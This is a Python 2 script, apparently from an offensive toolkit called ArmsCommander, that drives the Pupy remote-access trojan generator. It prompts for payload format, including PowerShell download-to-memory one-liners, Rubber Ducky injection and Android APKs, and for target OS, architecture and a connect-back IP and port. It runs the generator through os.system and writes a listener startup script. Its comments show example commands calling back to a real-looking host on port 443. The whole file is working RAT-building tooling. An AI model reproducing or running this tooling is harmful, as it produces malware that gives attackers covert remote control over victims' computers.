#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
	# - exe_86, exe_x64  : generate PE exe for windows
# root@Cylon-Basestar:~/pupy/pupy# python /root/pupy/pupy/pupygen.py -f client -O windows -A x86 connect --host 52.53.180.45:443 -t ssl

# CRITICAL UPDATE 4/17
# NinjaSec changed his output formats accoridng to It doesn't work because of cffi_backend. I add linux one to ignore list and forget about windows pyd =
# https://github.com/n1nj4sec/pupy/commit/1fa9343210a16fea90f093f7a1439675715add73
# The new APril 17th format is:
#                   [-f {client, # so basically client = numbers one to eight
#                   py,pyinst,
#                   py_oneliner,
#                   ps1,
#                   ps1_oneliner,
#                   rubber_ducky}]

format_Dict = {
    # '1': 'exe_x86',
    # '2': 'exe_x64',
    # '3': 'dll_x86',
    # '4': 'dll_x64',
    # '5': 'lin_x86',
    # '6': 'lin_x64',
    # '7': 'so_x86',
    # '8': 'so_x64',
    '1': 'client',
    '2': 'py',
    '3': 'pyinst',
    '4': 'py_oneliner',
    '5': 'ps1',
    '6': 'ps1_oneliner',
    '7': 'rubber_ducky',
    '8': 'apk'
}

# New syntax format Pupy Generator is...
# python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443

format_List = [
    '\n\t1 Client',
    '2 Standalone Python *.py format',
    '3 Python pyinstaller wrapper file',
    '4 One-Liner HTTP Download-to-Memory Payload',
    '5 ps1 Powershell script, injects a pupy dll into a current process',
    '6 ps1 Remote Download Powershell-to-Pupy script',
    '7 Rubber Ducky Script and Injection binary file',
    '8 Generate a Android-Compatible Pupy APK installer'
]
#

transport_Dict = {
    '1': 'obfs3',
    '2': 'udp',
    '3': 'http',
    '4': 'tcp_cleartext',
    '5': 'rsa',
    '6': 'ssl',
    '7': 'udp_cleartext',
    '8': 'scramblesuit',
    '9': 'ssl_rsa'
}
transport_List = [
    '\n\t1 obfs3',
    '2 udp',
    '3 http',
    '4 tcp_cleartext',
    '5 rsa',
    '6 ssl',
    '7 udp_cleartext',
    '8 scramblesuit',
    '9 ssl_rsa'
]

# New syntax format Pupy Generator is...
# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443

OS_Dict = {
    '1': 'windows',
    '2': 'linux',
    '3': 'android'
}

OS_List = [
    '\n\t#1. Windows Compatible Payload',
    '#2. Linux',
    '#3. Android'
]

Arch_Dict = {
    '1': 'x86',
    '2': 'x64'
}

Arch_List = [
    '\n\t#1. 32-bit',
    '#2. 64-bit'
]

# Ask user for type of payload
print ("\n\t".join(format_List))
payload_Type = str(raw_input("Enter a NUMBER for payload type: "))
payload_Selected = format_Dict[payload_Type]

# Ask user for the type of OS they are targeting
print ("\n\t".join(OS_List))
OS_Type = str(raw_input("Enter a NUMBER for OPERATING SYSTEM: "))
OS_Selected = OS_Dict[OS_Type]

print ("\n\t".join(Arch_List))
Arch_Type = str(raw_input("Enter a NUMBER for ARCHITECTURE: "))
Arch_Selected = Arch_Dict[Arch_Type]

host_Connectback = str(raw_input("Enter the IP address where the RAT will connect back to: "))

host_Port = str(raw_input("Enter the PORT of the IP address to connect back to: "))

print ("\n\t".join(transport_List))
host_Transport = str(raw_input("Enter the TRANSPORT (PROTOCOL)"))
# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} --randomize-hash connect --host {3}:{4}".format(
    payload_Selected,
    OS_Selected,
    Arch_Selected,
    host_Connectback,
    host_Port
)

print colored(cmd_String,'red','on_white')
os.system(cmd_String)
# print colored('Your payload is generated and is %s','red','on_white') % payload_Selected
print colored('Your server that it is set to listen on is %s','red','on_white') % host_Connectback
print colored('Your port that the payload is to connect back to is %s','red','on_white') % host_Port
print 'Remember all of this when you are going to start up your listener, handle just as if it was a regular Metasploit listener'

# Autostart Script for Listener
# Generates a script file that will run Pupy Server with the correct parameters
pupy_installation_path = '/root/pupy/pupy'
premade_startup_script_string = "sudo python /root/pupy/pupy/pupysh.py -t " + transport_Dict[host_Transport] + ' -p ' + host_Port
premade_startup_script_location = "/root/ArmsCommander/pupy_server_startup.sh"
saved_startup_file = open(premade_startup_script_location, 'w')
saved_startup_file.write('cd ' + pupy_installation_path)
saved_startup_file.write('\n' + premade_startup_script_string)
saved_startup_file.close()

# Modifies file permissiosn in /root/ArmsCommander to allow the startup script to execute
os.system('chmod 777 /root/ArmsCommander/*')
print 'PREGENERATED SERVER STARTUP SCRIPT CREATED'
print 'Your startup script is located at: %s' % premade_startup_script_location
os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
